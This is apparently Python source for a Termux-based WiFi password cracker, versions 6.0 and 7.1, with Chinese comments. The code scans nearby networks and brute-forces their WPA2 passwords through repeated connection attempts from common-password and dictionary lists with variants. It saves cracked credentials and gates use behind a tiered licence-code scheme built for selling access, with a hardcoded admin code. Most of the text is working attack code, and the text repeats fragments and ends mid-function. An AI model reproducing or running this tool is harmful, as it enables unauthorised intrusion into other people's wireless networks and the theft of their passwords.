            self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
            return

        if code not in self.usage_records:
            self.usage_records[code] = datetime.now(timezone.utc).isoformat()
            self.save_usage_records()

        start_time = datetime.fromisoformat(self.usage_records[code])
        num, unit = re.match(r"(\d+)([天月年])", duration).groups()
        num = int(num)

        delta = {
            '天': timedelta(days=num),
            '月': timedelta(days=num*30),
            '年': timedelta(days=num*365)
        }[unit]
        
        self.expiry_time = start_time + delta

    def load_usage_records(self):
        """加载使用记录"""
        if os.path.exists(USAGE_FILE):
            try:
                with open(USAGE_FILE, "r") as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def save_usage_records(self):
        """保存使用记录"""
        with open(USAGE_FILE, "w") as f:
            json.dump(self.usage_records, f)

    def get_remaining_time(self):
        """获取剩余授权时间"""
        if self.expiry_time:
            remaining = self.expiry_time - datetime.now(timezone.utc)
            return max(remaining, timedelta(0))
        return timedelta(0)

# ...（后续部分将在下一条消息中提供）

#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import gc
import subprocess
import logging
import json
from datetime import datetime, timedelta, timezone
from itertools import islice
from cryptography.fernet import Fernet
from enum import Enum

# ====== 进度条配置 ======
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False
    class SimpleProgress:
        def __init__(self, total):
            self.total = total
            self.start = time.time()
            self.last_print = 0
            
        def update(self, current):
            now = time.time()
            if now - self.last_print > 1:
                elapsed = now - self.start
                rate = current / elapsed if elapsed > 0 else 0
                remain = (self.total - current) / rate if rate > 0 else 0
                print(f"\r进度: {current}/{self.total} | 速度: {rate:.1f}次/秒 | 已用: {timedelta(seconds=int(elapsed))} | 剩余: {timedelta(seconds=int(remain))}", end="")
                self.last_print = now

# ====== 全局配置 ======
VERSION = "6.0"
DICT_DIR = "/storage/emulated/0/aiHuanying"
LOG_FILE = os.path.join(DICT_DIR, "wifi_cracker.log")
SUCCESS_DICT = os.path.join(DICT_DIR, "success_records.txt")
ENCRYPTION_KEY_FILE = os.path.join(DICT_DIR, ".wifi_key")
SCAN_TIMEOUT = 15
ATTEMPT_DELAY = (1.0, 2.0)
MAX_MEMORY_CHUNK = 50000
COMMON_PASSWORDS = [
    '12345678', 'password', 'qwertyui', '88888888',
    '11111111', 'admin', '1234567890', 'abcd1234'
]

class UserType(Enum):
    SUPER_ADMIN = "超级管理员"
    AGENT = "代理会员"
    PERMANENT = "尊贵会员"
    NORMAL = "普通成员"

# ====== 授权管理系统 ======
ADMIN_CODE = "1466297085"
AUTH_FILE = os.path.join(DICT_DIR, "授权码.txt")
USAGE_FILE = os.path.join(DICT_DIR, ".usage_records")

class AuthManager:
    """多级授权管理系统"""
    def __init__(self):
        self.auth_codes = {}  # {code: (code_type, duration)}
        self.usage_records = self.load_usage_records()
        self.user_type = None
        self.expiry_time = None
        self.load_auth_codes()

    def generate_permanent_code(self):
        """生成永久授权码（最大6大写，至少20小写）"""
        upper_count = random.randint(0, 6)
        lower_count = 32 - upper_count
        lower_count = max(lower_count, 20)  # 确保至少20小写
        
        chars = []
        chars += random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=upper_count)
        chars += random.choices('abcdefghijklmnopqrstuvwxyz', k=lower_count)
        chars += random.choices('0123456789', k=32-len(chars))
        
        random.shuffle(chars)
        return ''.join(chars)

    def generate_agent_code(self):
        """生成代理商授权码（12大写+12小写+8数字）"""
        chars = []
        chars += random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=12)
        chars += random.choices('abcdefghijklmnopqrstuvwxyz', k=12)
        chars += random.choices('0123456789', k=8)
        random.shuffle(chars)
        return ''.join(chars)

    def generate_normal_code(self):
        """生成普通授权码（至少7小写）"""
        lower_count = random.randint(7, 25)
        remaining = 32 - lower_count
        
        chars = []
        chars += random.choices('abcdefghijklmnopqrstuvwxyz', k=lower_count)
        chars += random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=remaining)
        random.shuffle(chars)
        return ''.join(chars)

    def generate_code(self, code_type):
        """生成授权码"""
        try:
            count = int(input("生成数量（默认500）: ") or 500)
            duration_str = "永久" if code_type in ['permanent', 'agent'] else input("有效期（示例：30天/3月/1年）: ")
        except Exception as e:
            print(f"错误: {str(e)}")
            return False

        codes = []
        for _ in range(count):
            if code_type == 'permanent':
                code = self.generate_permanent_code()
            elif code_type == 'agent':
                code = self.generate_agent_code()
            else:
                code = self.generate_normal_code()
            
            codes.append(f"{code},{code_type},{duration_str}")
            self.auth_codes[code] = (code_type, duration_str)
        
        with open(AUTH_FILE, "a") as f:
            f.write("\n".join(codes) + "\n")
        print(f"成功生成{count}个{code_type}授权码至{AUTH_FILE}")
        return True

    def analyze_code_type(self, code):
        """分析授权码类型"""
        if len(code) != 32:
            return 'invalid'
            
        upper = sum(1 for c in code if c.isupper())
        lower = sum(1 for c in code if c.islower())
        digit = sum(1 for c in code if c.isdigit())
        
        if upper <= 6 and lower >= 20 and digit <= 6:
            return 'permanent'
        elif upper == 12 and lower == 12 and digit == 8:
            return 'agent'
        elif lower >= 7 and (upper + digit) == (32 - lower):
            return 'normal'
        return 'invalid'

    def load_auth_codes(self):
        """加载授权码数据库"""
        if os.path.exists(AUTH_FILE):
            with open(AUTH_FILE, "r") as f:
                for line in f:
                    try:
                        code, code_type, duration = line.strip().rsplit(',', 2)
                        self.auth_codes[code] = (code_type, duration)
                    except:
                        continue

    def validate_code(self, code):
        """验证授权码"""
        if code == ADMIN_CODE:
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
            return True
        
        if code in self.auth_codes:
            code_type, duration = self.auth_codes[code]
            
            # 自动检测类型（兼容旧版本）
            if code_type == 'auto':
                detected_type = self.analyze_code_type(code)
                if detected_type == 'invalid':
                    return False
                code_type = detected_type
            
            # 设置用户类型
            self.user_type = {
                'permanent': UserType.PERMANENT,
                'agent': UserType.AGENT,
                'normal': UserType.NORMAL
            }.get(code_type, UserType.NORMAL)

            # 处理有效期
            if duration == "永久":
                self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
                return True

            # 首次使用记录时间
            if code not in self.usage_records:
                self.usage_records[code] = datetime.now(timezone.utc).isoformat()
                self.save_usage_records()
            
            # 解析有效期
            try:
                num, unit = re.match(r"(\d+)([天月年])", duration).groups()
                num = int(num)
            except:
                return False

            # 计算有效期
            start_time = datetime.fromisoformat(self.usage_records[code]).astimezone(timezone.utc)
            
            if unit == "天":
                self.expiry_time = start_time + timedelta(days=num)
            elif unit == "月":
                self.expiry_time = start_time + timedelta(days=num*30)
            elif unit == "年":
                self.expiry_time = start_time + timedelta(days=num*365)
            
            return datetime.now(timezone.utc) < self.expiry_time
        return False

    def load_usage_records(self):
        """加载使用记录"""
        if os.path.exists(USAGE_FILE):
            try:
                with open(USAGE_FILE, "r") as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def save_usage_records(self):
        """保存使用记录"""
        with open(USAGE_FILE, "w") as f:
            json.dump(self.usage_records, f)

    def get_remaining_time(self):
        """获取剩余授权时间"""
        if self.expiry_time:
            remaining = self.expiry_time - datetime.now(timezone.utc)
            return max(remaining, timedelta(0))
        return timedelta(0)

def check_authorization():
    """增强授权验证流程"""
    print("\n{:=^50}".format(" 多级授权验证 "))
    auth_mgr = AuthManager()
    
    while True:
        code = input("请输入32位授权码（Q退出）: ").strip()
        if code.upper() == 'Q':
            sys.exit()
        
        if len(code) != 32:
            print("授权码长度必须为32位！")
            continue
            
        if auth_mgr.validate_code(code):
            print(f"\n验证通过！欢迎，{auth_mgr.user_type.value}")
            return auth_mgr
        else:
            print("无效或过期的授权码！")

# ====== 环境初始化 ======
def setup_environment():
    """初始化文件系统和必要目录"""
    try:
        os.makedirs(DICT_DIR, exist_ok=True)
        # 创建默认字典
        if not os.path.exists(DEFAULT_DICT):
            with open(DEFAULT_DICT, 'w') as f:
                f.write('\n'.join(COMMON_PASSWORDS))
        # 创建其他必要文件
        for f in [SUCCESS_DICT, LOG_FILE]:
            if not os.path.exists(f):
                open(f, 'a').close()
    except Exception as e:
        logging.error(f"初始化失败: {str(e)}")

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler()
        ]
    )

class EnhancedDictManager:
    """字典管理系统"""
    def __init__(self):
        self.available = []
        self.selected = []
        self.refresh_dicts()
    
    def refresh_dicts(self):
        self.available.clear()
        try:
            # 添加默认字典
            default_info = {
                'path': DEFAULT_DICT,
                'size': os.path.getsize(DEFAULT_DICT),
                'count': self._count_lines(DEFAULT_DICT),
                'name': os.path.basename(DEFAULT_DICT)
            }
            self.available.append(default_info)
            
            # 添加其他字典
            for fname in os.listdir(DICT_DIR):
                if fname.endswith('.txt') and fname != os.path.basename(DEFAULT_DICT):
                    path = os.path.join(DICT_DIR, fname)
                    stat = os.stat(path)
                    self.available.append({
                        'path': path,
                        'size': stat.st_size,
                        'count': self._count_lines(path),
                        'name': os.path.basename(path)
                    })
            self.available.sort(key=lambda x: -x['size'])
        except Exception as e:
            logging.error("刷新字典失败: %s", str(e))
    
    def _count_lines(self, path):
        try:
            with open(path, 'rb') as f:
                return sum(1 for _ in f)
        except:
            return 0
    
    def interactive_select(self):
        self.refresh_dicts()
        if not self.available:
            print("未找到可用字典")
            return False
            
        print("\n{:=^50}".format(" 字典列表 "))
        recommend = self.available[:3]
        for idx, d in enumerate(self.available, 1):
            rec_flag = "★" if d in recommend else " "
            print(f"{rec_flag}{idx:>2}. {d['name'][:20]:<20} {self.human_size(d['size']):>8} {d['count']:>8}条")

        while True:
            choices = input("\n请输入要使用的字典编号(推荐1-3，多个用逗号): ").strip()
            if not choices:
                choices = '1,2,3'
            try:
                selected_indices = [int(i)-1 for i in choices.split(',')]
                valid = all(0 <= i < len(self.available) for i in selected_indices)
                if not valid:
                    raise ValueError
                self.selected = [self.available[i] for i in selected_indices]
                print("\n已选择字典：")
                for d in self.selected:
                    print(f"· {d['name']}")
                return True
            except:
                print("输入无效，请重新输入")

    @staticmethod
    def human_size(size):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.1f}{unit}"
            size /= 1024.0
        return f"{size:.1f}TB"
        
class AdvancedWiFiScanner:
    """网络扫描模块"""
    def __init__(self):
        self.networks = []
        self.selected = []
    
    def scan(self):
        try:
            result = subprocess.run(
                ['termux-wifi-scaninfo'],
                capture_output=True,
                text=True,
                timeout=SCAN_TIMEOUT
            )
            if result.returncode == 0:
                self.networks = sorted(
                    eval(result.stdout),
                    key=lambda x: x['rssi'],
                    reverse=True
                )
                return True
            return False
        except Exception as e:
            logging.error("扫描失败: %s", str(e))
            return False
    
    def interactive_select(self):
        if not self.networks:
            print("请先扫描网络")
            return False
            
        print("\n{:=^50}".format(" 网络列表 "))
        recommend = self.networks[:3]
        print("{:<4}{:<25}{:<8}{}".format("序号", "SSID", "信号", "推荐"))
        for idx, net in enumerate(self.networks, 1):
            ssid = net['ssid'][:20].ljust(20)
            rssi = f"{net['rssi']}dBm"
            rec_flag = "★" if net in recommend else ""
            print(f"{idx:>2}. {ssid} {rssi:>8} {rec_flag:^5}")

        while True:
            choices = input("\n请输入目标编号(推荐1-3，多个用逗号): ").strip()
            if not choices:
                choices = '1,2,3'
            try:
                selected_indices = [int(i)-1 for i in choices.split(',')]
                valid = all(0 <= i < len(self.networks) for i in selected_indices)
                if not valid:
                    raise ValueError
                self.selected = sorted(
                    [self.networks[i] for i in selected_indices],
                    key=lambda x: x['rssi'],
                    reverse=True
                )
                print("\n已选择网络：")
                for n in self.selected:
                    print(f"· {n['ssid']} ({n['rssi']}dBm)")
                return True
            except:
                print("输入无效，请重新输入")

class WiFiCrackerCore:
    """破解核心模块"""
    def __init__(self, dicts, auth_mgr):
        self.dicts = dicts
        self.auth_mgr = auth_mgr
        self.stats = {
            'total': sum(d['count'] for d in dicts),
            'attempted': 0,
            'start_time': datetime.now(timezone.utc),
            'current_ssid': None,
            'found_password': None
        }
        self.cipher = self.init_cipher()
        self.running = True
    
    def init_cipher(self):
        if os.path.exists(ENCRYPTION_KEY_FILE):
            with open(ENCRYPTION_KEY_FILE, 'rb') as f:
                return Fernet(f.read())
        key = Fernet.generate_key()
        with open(ENCRYPTION_KEY_FILE, 'wb') as f:
            f.write(key)
            os.chmod(ENCRYPTION_KEY_FILE, 0o600)
        return Fernet(key)
    
    def try_connect(self, ssid, password):
        try:
            subprocess.run(['termux-wifi-enable', 'true'],
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL,
                          timeout=5)
            
            result = subprocess.run(
                ['termux-wifi-connectnetwork', ssid, 'wpa2', password],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=15
            )
            
            check = subprocess.run(['termux-wifi-connectioninfo'],
                                 capture_output=True,
                                 text=True,
                                 timeout=5)
            return 'ssid' in check.stdout.lower() and ssid in check.stdout
        except Exception as e:
            return False
    
    def save_result(self, ssid, password):
        encrypted = self.cipher.encrypt(f"{ssid}|{password}".encode())
        with open(SUCCESS_DICT, 'ab') as f:
            f.write(encrypted + b'\n')
        logging.info("成功破解! SSID: %s 密码: %s", ssid, password)
        self.stats['found_password'] = password
    
    def generate_variants(self, base):
        variants = {
            base, base.upper(), base.lower(),
            base.capitalize(), base + '123',
            base + '!', base + '@', base + '888'
        }
        if re.match(r'^[a-zA-Z]+$', base):
            variants.update({base + '1234', base + '2023'})
        return variants
    
    def crack_single(self, ssid):
        logging.info("开始破解: %s", ssid)
        self.stats['current_ssid'] = ssid
        
        # 初始化进度条
        if HAS_TQDM:
            pbar = tqdm(total=self.stats['total'], 
                       desc=f"破解 {ssid[:15]}",
                       unit="次",
                       bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [剩余: {remaining}, 速度: {rate_fmt}]")
        else:
            pbar = SimpleProgress(self.stats['total'])
        
        try:
            # 优先测试常见密码
            for pwd in COMMON_PASSWORDS:
                if not self.running:
                    break
                if self.try_connect(ssid, pwd):
                    self.save_result(ssid, pwd)
                    if HAS_TQDM:
                        pbar.close()
                    return True
                time.sleep(random.uniform(*ATTEMPT_DELAY))
            
            # 字典破解
            for dict_info in self.dicts:
                if not self.running or self.stats['found_password']:
                    break
                
                with open(dict_info['path'], 'r', errors='ignore') as f:
                    for line in islice(f, MAX_MEMORY_CHUNK):
                        if not self.running:
                            break
                        
                        # 检查授权剩余时间
                        remaining = self.auth_mgr.get_remaining_time()
                        if remaining.total_seconds() <= 0:
                            print("\n授权已过期！")
                            self.running = False
                            break
                        
                        base = line.strip()
                        for variant in self.generate_variants(base):
                            if not self.running:
                                break
                            
                            self.stats['attempted'] += 1
                            if HAS_TQDM:
                                pbar.update(1)
                            else:
                                pbar.update(self.stats['attempted'])
                            
                            if self.try_connect(ssid, variant):
                                self.save_result(ssid, variant)
                                if HAS_TQDM:
                                    pbar.close()
                                return True
                            
                            # 显示动态信息
                            now = datetime.now(timezone.utc)
                            elapsed = now - self.stats['start_time']
                            remain_time = self.auth_mgr.get_remaining_time()
                            print(f"\n授权剩余: {remain_time} | 身份: {self.auth_mgr.user_type.value} | ", end="")
                            
                            time.sleep(random.uniform(*ATTEMPT_DELAY))
                        
                        if self.stats['attempted'] % 1000 == 0:
                            gc.collect()
        finally:
            if HAS_TQDM:
                pbar.close()
        
        return False

    def cleanup(self):
        self.running = False
        sys.stdout.write('\n'*6)

class MainApp:
    def __init__(self, auth_mgr):
        self.dict_mgr = EnhancedDictManager()
        self.scanner = AdvancedWiFiScanner()
        self.cracker = None
        self.last_success = None
        self.auth_mgr = auth_mgr

    def show_menu(self):
        menu_items = [
            "1. 扫描并选择网络",
            "2. 选择密码字典",
            "3. 开始破解",
            "4. 查看历史记录",
            "5. 显示最后成功记录",
            "0. 退出程序"
        ]
        
        if self.auth_mgr.user_type == UserType.SUPER_ADMIN:
            menu_items.insert(5, "9. 管理员功能")
        elif self.auth_mgr.user_type == UserType.AGENT:
            menu_items.insert(5, "8. 代理商功能")
        
        print("\n{:=^50}".format(f" WiFi安全分析系统 {VERSION} "))
        print("\n".join(menu_items))

    def admin_menu(self):
        print("\n{:=^50}".format(" 管理员功能 "))
        print("1. 生成永久授权码")
        print("2. 生成代理商授权码")
        print("3. 生成普通授权码")
        print("4. 查看授权记录")
        print("0. 返回主菜单")
        
        choice = input("请输入选项: ").strip()
        if choice == '1':
            self.auth_mgr.generate_code("permanent")
        elif choice == '2':
            self.auth_mgr.generate_code("agent")
        elif choice == '3':
            self.auth_mgr.generate_code("normal")
        elif choice == '4':
            self.show_auth_records()
        elif choice == '0':
            return
        else:
            print("无效输入")

    def agent_menu(self):
        print("\n{:=^50}".format(" 代理商功能 "))
        print("1. 生成普通授权码")
        print("0. 返回主菜单")
        
        choice = input("请输入选项: ").strip()
        if choice == '1':
            self.auth_mgr.generate_code("normal")
        elif choice == '0':
            return
        else:
            print("无效输入")

    def show_auth_records(self):
        try:
            with open(USAGE_FILE, "r") as f:
                records = json.load(f)
                print("\n{:=^50}".format(" 授权使用记录 "))
                for code, start_time in records.items():
                    start = datetime.fromisoformat(start_time)
                    print(f"授权码: {code} | 首次使用时间: {start.strftime('%Y-%m-%d %H:%M:%S')}")
                print("="*50)
        except Exception as e:
            print("暂无授权记录")

    def handle_confirm(self, prompt):
        resp = input(prompt).strip().lower()
        return resp in ['', 'y', 'yes']

    def show_history(self):
        try:
            cipher = Fernet(open(ENCRYPTION_KEY_FILE, 'rb').read())
            with open(SUCCESS_DICT, 'rb') as f:
                print("\n{:=^50}".format(" 历史破解记录 "))
                for line in f:
                    try:
                        decrypted = cipher.decrypt(line.strip()).decode()
                        ssid, pwd = decrypted.split('|')
                        print(f"SSID: {ssid:<25} 密码: {pwd}")
                    except:
                        continue
                print("="*50)
        except Exception as e:
            logging.error("读取历史记录失败: %s", str(e))

    def exit_app(self):
        print("\n正在清理资源...")
        if self.cracker:
            self.cracker.cleanup()
        print("感谢使用！")
        sys.exit(0)

    def run(self):
        while True:
            self.show_menu()
            
            # 显示授权信息
            if self.auth_mgr.user_type != UserType.SUPER_ADMIN:
                remaining = self.auth_mgr.get_remaining_time()
                print(f"\n当前身份: {self.auth_mgr.user_type.value}")
                print(f"授权剩余时间: {remaining}")
            
            choice = input("请输入选项: ").strip()
            
            if choice == '1':
                print("\n=== 网络扫描 ===")
                if self.scanner.scan():
                    print(f"发现 {len(self.scanner.networks)} 个网络")
                    self.scanner.interactive_select()
                else:
                    print("扫描失败，请检查权限")
            
            elif choice == '2':
                print("\n=== 字典选择 ===")
                self.dict_mgr.interactive_select()
            
            elif choice == '3':
                if not self.scanner.selected:
                    print("请先选择目标网络")
                    continue
                if not self.dict_mgr.selected:
                    print("请先选择字典")
                    continue
                if not self.handle_confirm("\n确定开始破解吗？(Y/n): "):
                    continue
                
                self.cracker = WiFiCrackerCore(self.dict_mgr.selected, self.auth_mgr)
                print("\n=== 开始破解 ===")
                print("按 Ctrl+C 停止")
                try:
                    for net in self.scanner.selected:
                        if self.cracker.crack_single(net['ssid']):
                            self.last_success = {
                                'ssid': net['ssid'],
                                'password': self.cracker.stats['found_password'],
                                'time': datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                            }
                            break
                except KeyboardInterrupt:
                    self.cracker.cleanup()
                    print("\n破解已中止")
            
            elif choice == '4':
                self.show_history()
            
            elif choice == '5':
                if self.last_success:
                    print("\n{:=^50}".format(" 最后成功记录 "))
                    print(f"SSID: {self.last_success['ssid']}")
                    print(f"密码: {self.last_success['password']}")
                    print(f"时间: {self.last_success['time']}")
                    print("="*50)
                else:
                    print("暂无成功记录")
            
            elif choice == '9' and self.auth_mgr.user_type == UserType.SUPER_ADMIN:
                self.admin_menu()
            
            elif choice == '8' and self.auth_mgr.user_type == UserType.AGENT:
                self.agent_menu()
            
            elif choice == '0':
                self.exit_app()
            
            else:
                print("无效输入")

def auto_install_dependencies():
    """自动环境配置"""
    print("\n{:=^50}".format(" 环境检测 "))
    
    # 检测Termux API
    termux_commands = [
        'termux-wifi-scaninfo',
        'termux-wifi-connectnetwork',
        'termux-wifi-enable'
    ]
    missing_termux = []
    for cmd in termux_commands:
        result = subprocess.run(['which', cmd], 
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE)
        if result.returncode != 0:
            missing_termux.append('termux-api')
    
    # 安装Termux依赖
    if missing_termux:
        print("检测到缺失Termux组件，正在安装...")
        try:
            subprocess.run(['pkg', 'install', '-y', 'termux-api'],
                          check=True)
        except Exception as e:
            print(f"安装失败: {str(e)}")

    # 检测Python库
    try:
        __import__('cryptography.fernet')
    except ImportError:
        print("正在安装Python依赖...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'cryptography'],
                          check=True)
            os.execl(sys.executable, sys.executable, *sys.argv)
        except Exception as e:
            print(f"安装失败: {str(e)}")

    # 检查存储权限
    if not os.path.exists('/sdcard'):
        print("\n请授予Termux存储权限！")
        subprocess.run(['termux-setup-storage'])

if __name__ == "__main__":
    auto_install_dependencies()
    setup_logging()
    setup_environment()
    
    # 授权验证
    auth_mgr = check_authorization()
    
    print("""
    ██╗    ██╗██╗███████╗██╗    ██████╗ ██████╗  ██████╗ 
    ██║    ██║██║██╔════╝██║    ██╔══██╗██╔══██╗██╔════╝ 
    ██║ █╗ ██║██║█████╗  ██║    ██║  ██║██████╔╝██║  ███╗
    ██║███╗██║██║██╔══╝  ██║    ██║  ██║██╔══██╗██║   ██║
    ╚███╔███╔╝██║██║     ██║    ██████╔╝██║  ██║╚██████╔╝
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
    """)
    print(f"{'v' + VERSION:^50}")
    print("{:=^50}".format(" 仅限合法授权使用 "))
    app = MainApp(auth_mgr)
    try:
        app.run()
    except KeyboardInterrupt:
        app.exit_app()
        
        #!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import string
import gc
import subprocess
import logging
import json
from datetime import datetime, timedelta, timezone
from itertools import islice
from cryptography.fernet import Fernet
from enum import Enum

# ====== 进度条配置 ======
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False
    class SimpleProgress:
        def __init__(self, total):
            self.total = total
            self.start = time.time()
            self.last_print = 0
            
        def update(self, current):
            now = time.time()
            if now - self.last_print > 1:
                elapsed = now - self.start
                rate = current / elapsed if elapsed > 0 else 0
                remain = (self.total - current) / rate if rate > 0 else 0
                print(f"\r进度: {current}/{self.total} | 速度: {rate:.1f}次/秒 | 已用: {timedelta(seconds=int(elapsed))} | 剩余: {timedelta(seconds=int(remain))}", end="")
                self.last_print = now

# ====== 全局配置 ======
VERSION = "7.1"
DICT_DIR = "/storage/emulated/0/aiHuanying"
AUTH_FILES = {
    'admin': os.path.join(DICT_DIR, "管理员授权码.txt"),       # 存储所有类型授权码
    'agent': os.path.join(DICT_DIR, "代理商授权码.txt"),       # 存储代理商及以下
    'permanent': os.path.join(DICT_DIR, "永久授权码.txt"),     # 存储永久和普通
    'normal': os.path.join(DICT_DIR, "普通授权码.txt")         # 存储普通授权码
}
LOG_FILE = os.path.join(DICT_DIR, "wifi_cracker.log")
SUCCESS_DICT = os.path.join(DICT_DIR, "success_records.txt")
ENCRYPTION_KEY_FILE = os.path.join(DICT_DIR, ".wifi_key")
USAGE_FILE = os.path.join(DICT_DIR, ".usage_records")
SCAN_TIMEOUT = 15
ATTEMPT_DELAY = (1.0, 2.0)
MAX_MEMORY_CHUNK = 50000
COMMON_PASSWORDS = [
    '12345678', 'password', 'qwertyui', '88888888',
    '11111111', 'admin', '1234567890', 'abcd1234'
]

# ====== 枚举定义 ======
class UserType(Enum):
    SUPER_ADMIN = ("超级管理员", "无到期时间", 5)
    ADMIN = ("管理员", "永久", 4)
    AGENT = ("代理商", "永久", 3)
    SUPER_MEMBER = ("超级会员", "永久", 2)  # 5年以上或永久
    NORMAL_MEMBER = ("普通会员", "计时", 1)  # 普通会员

    def __init__(self, chinese_name, expiry_type, level):
        self.chinese = chinese_name
        self.expiry_type = expiry_type
        self.level = level

# ====== 授权管理系统 ======
HIDDEN_ADMIN_CODE = bytes.fromhex('31343636323937303835').decode()  # 隐藏的管理员代码（实际应使用加密存储）

class AuthManager:
    """增强型多级授权管理系统"""
    def __init__(self):
        self.auth_files_hierarchy = {
            'admin': ['admin', 'agent', 'permanent', 'normal'],
            'agent': ['agent', 'permanent', 'normal'],
            'permanent': ['permanent', 'normal'],
            'normal': ['normal']
        }
        self.auth_codes = {}  # {code: (code_type, duration, first_use)}
        self.usage_records = self._load_usage_records()
        self.user_type = None
        self.expiry_time = None
        self._load_all_auth_codes()

    def _load_all_auth_codes(self):
        """按层级加载授权码（追加模式）"""
        for file_type in ['admin', 'agent', 'permanent', 'normal']:
            file_path = AUTH_FILES[file_type]
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            parts = line.split(',', 2)
                            code = parts[0]
                            code_type = parts[1]
                            duration = parts[2]
                            self.auth_codes[code] = (code_type, duration)
                        except:
                            continue

    def _load_usage_records(self):
        """加载使用记录（首次使用时间）"""
        if os.path.exists(USAGE_FILE):
            try:
                with open(USAGE_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def save_usage_records(self):
        """保存使用记录"""
        with open(USAGE_FILE, 'w') as f:
            json.dump(self.usage_records, f)

    def generate_code(self, target_type):
        """生成指定类型授权码并按层级写入文件"""
        code = self._generate_code(target_type)
        duration = self._get_duration(target_type)
        entry = f"{code},{target_type},{duration}\n"
        
        # 写入所有符合层级的文件
        target_files = self.auth_files_hierarchy.get(target_type, [])
        for f_type in target_files:
            with open(AUTH_FILES[f_type], 'a') as f:
                f.write(entry)
        return code

    def _generate_code(self, code_type):
        """生成授权码（管理员码特殊处理）"""
        if code_type == 'admin':
            return HIDDEN_ADMIN_CODE  # 特殊管理员代码
        
        rand = random.SystemRandom()
        if code_type == 'agent':
            # 12大写+12小写+8数字
            chars = rand.choices(string.ascii_uppercase, k=12) + \
                    rand.choices(string.ascii_lowercase, k=12) + \
                    rand.choices(string.digits, k=8)
        elif code_type == 'permanent':
            # 最多6大写+至少20小写
            upper = rand.randint(0, 6)
            lower = 32 - upper
            chars = rand.choices(string.ascii_uppercase, k=upper) + \
                    rand.choices(string.ascii_lowercase, k=lower)
        else:  # normal
            # 至少7小写
            lower = rand.randint(7, 25)
            chars = rand.choices(string.ascii_lowercase, k=lower) + \
                    rand.choices(string.ascii_uppercase + string.digits, k=32-lower)
        
        rand.shuffle(chars)
        return ''.join(chars)

    def _get_duration(self, code_type):
        """获取有效期描述（包含生成时间）"""
        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        if code_type in ['admin', 'agent']:
            return f"永久,{now}"
        elif code_type == 'permanent':
            return f"5年,{now}"
        else:
            return f"30天,{now}"

    def validate_code(self, code):
        """增强版授权码验证（支持短码管理员码）"""
        # 特殊管理员码验证（不限制长度）
        if code == HIDDEN_ADMIN_CODE:
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = None  # 无到期时间
            return True

        # 普通授权码验证（32位检查）
        if len(code) != 32 and code != HIDDEN_ADMIN_CODE:
            return False

        if code in self.auth_codes:
            code_type, duration_info = self.auth_codes[code]
            duration, create_time = duration_info.split(',', 1)
            
            # 设置用户类型
            self._set_user_type(code_type)
            
            # 记录首次使用时间（仅首次）
            if code not in self.usage_records:
                self.usage_records[code] = datetime.now(timezone.utc).isoformat()
                self.save_usage_records()
            
            # 计算到期时间
            self.expiry_time = self._calculate_expiry(code_type, duration, create_time)
            return self._check_expiry()
        return False

    def _set_user_type(self, code_type):
        """映射授权码类型到用户类型"""
        type_mapping = {
            'admin': UserType.ADMIN,
            'agent': UserType.AGENT,
            'permanent': UserType.SUPER_MEMBER,
            'normal': UserType.NORMAL_MEMBER
        }
        self.user_type = type_mapping.get(code_type, UserType.NORMAL_MEMBER)

    def _calculate_expiry(self, code_type, duration, create_time):
        """根据类型和有效期计算到期时间"""
        create_time = datetime.strptime(create_time, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        
        if code_type in ['admin', 'agent']:
            return datetime.max.replace(tzinfo=timezone.utc)  # 永久有效
        elif code_type == 'permanent':
            return create_time + timedelta(days=5*365)
        else:
            return create_time + timedelta(days=30)

    def _check_expiry(self):
        """检查是否过期（永久用户跳过）"""
        if self.user_type in [UserType.SUPER_ADMIN, UserType.ADMIN, UserType.AGENT]:
            return True
        return datetime.now(timezone.utc) < self.expiry_time

    def get_remaining_time(self):
        """获取剩余授权时间"""
        if self.user_type.expiry_type == "永久":
            return "永久"
        
        if self.expiry_time:
            remaining = self.expiry_time - datetime.now(timezone.utc)
            return str(remaining).split('.')[0]  # 去除微秒
        return "0:00:00"

# ====== 环境初始化 ======
def setup_environment():
    """初始化文件系统和必要目录"""
    required_dirs = [DICT_DIR]
    required_files = {
        AUTH_FILES['admin']: "# 管理员授权码（存储所有类型）\n",
        AUTH_FILES['agent']: "# 代理商授权码（存储代理商及以下）\n",
        AUTH_FILES['permanent']: "# 永久授权码（存储永久和普通）\n",
        AUTH_FILES['normal']: "# 普通授权码（仅普通会员）\n"
    }

    try:
        for d in required_dirs:
            os.makedirs(d, exist_ok=True)
            os.chmod(d, 0o700)
        
        for path, content in required_files.items():
            if not os.path.exists(path):
                with open(path, 'w') as f:
                    f.write(content)
                os.chmod(path, 0o600)
        
